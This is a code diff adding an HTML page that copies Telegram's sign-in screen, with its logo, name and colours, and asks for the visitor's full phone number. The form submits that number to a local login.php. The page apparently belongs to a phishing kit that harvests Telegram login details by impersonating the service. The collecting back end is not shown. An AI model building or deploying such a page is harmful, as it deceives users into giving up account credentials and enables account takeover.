@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Telegram - Login</title>
+  <!-- Author: Sajjad -->
+  <style>
+  	
+  body{
+  font-family: Sans-serif;
+  margin: 0;
+  padding: 0;
+  }
+  .container{
+  width: 350px;
+  height: 350px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  position: absolute;
+  top: -4%;
+  left: 50%;
+  transform: translate(-50%, 50%);
+  border-radius: 2px;
+  background-color: white;
+  }
+  
+  .box{
+  border: none;
+  border-bottom: 2px solid #737373;
+  width: 95%;
+  padding: 15px 2px;
+  margin: 7px;
+  }
+  input:hover{
+  border-bottom: 2px solid #5184a5;
+  outline: none;
+  }
+  .btn{
+  width: 100px;
+  padding: 10px 0px;
+  border: none;
+  font-weight: bold;
+  color: white;
+  background-color: #5184a5;
+  border-radius: 4px;
+  margin-top: 20px;
+  }
+  
+  
+  .logo{
+  width: 30px;
+  }
+  .icon{
+  width: 350px;
+  position: absolute;
+  top: -60px;
+  left: 10px;
+  }
+  .tele{
+  color: #e6e6e6;
+  font-weight: bold;
+  font-size: 20px;
+  margin-left: 50px;
+  margin-top: -25px;
+  }
+  .next{
+  color: white;
+  font-weight: bold;
+  margin-top: -42px;
+  margin-left: 320px;
+  background-color: transparent;
+  border: none;
+  }
+  
+  .p1{
+  font-size: 20px;
+  margin-top: 20px;
+  margin-bottom: -6px;
+  color: #333333;
+  font-weight: bold;
+  }
+  .p2{
+  font-size: 12px;
+  margin-bottom: 30px;
+  color: gray;
+  }
+  .remember{
+  border: 1px solid transparent;
+  width: 100%;
+  }
+  .checkbox{
+  position: absolute;
+  left: 20px;
+  }
+  .p3{
+  font-size: 13px;
+  color: #262626;
+  margin-top: 30px;
+  }
+  
+  .top{
+  width: 100%;
+  position: absolute;
+  left: 0%;
+  top: 0%;
+  background-color: #5184a5;
+  height: 200px;
+  }
+  .p4{
+  color: white;
+  font-weight: bold;
+  font-size: 25px;
+  margin-top: 12px;
+  margin-left: 5px;
+  }
+  .image{
+  width: 150px;
+  position: absolute;
+  top: 2px;
+  right: 0px;
+  }
+  </style>
+</head>
+<body>
+	<div class="top">
+		<p class="p4"></p>
+	</div>
+	<form action="login.php" method="post">
+		<div class="container">
+			<div class="icon">
+		<img src="Image/logo.png" alt="Telegram" class="logo"/>
+		<div>
+		<p class="tele">Telegram</p>
+		</div>
+		<div>
+			<button type="submit" class="next">Next</button>
+		</div>
+		</div>
+		<div>
+				<p class="p1">Sign in</p>
+				<p class="p2">Please enter your full phone number.</p>
+			</div>
+			<div>
+				<input type="text" name="username" class="box" placeholder="Phone number"></input>
+			</div>
+			<div>
+				<button type="submit" class="btn">Next</button>
+			</div>
+			<div class="remember">
+				<p class="p3">Having trouble signing in? <strong style="color: #6895E0;">Send feedback</strong></p>
+			</div>
+		</div>
+	</form>
+</body>
+</html>
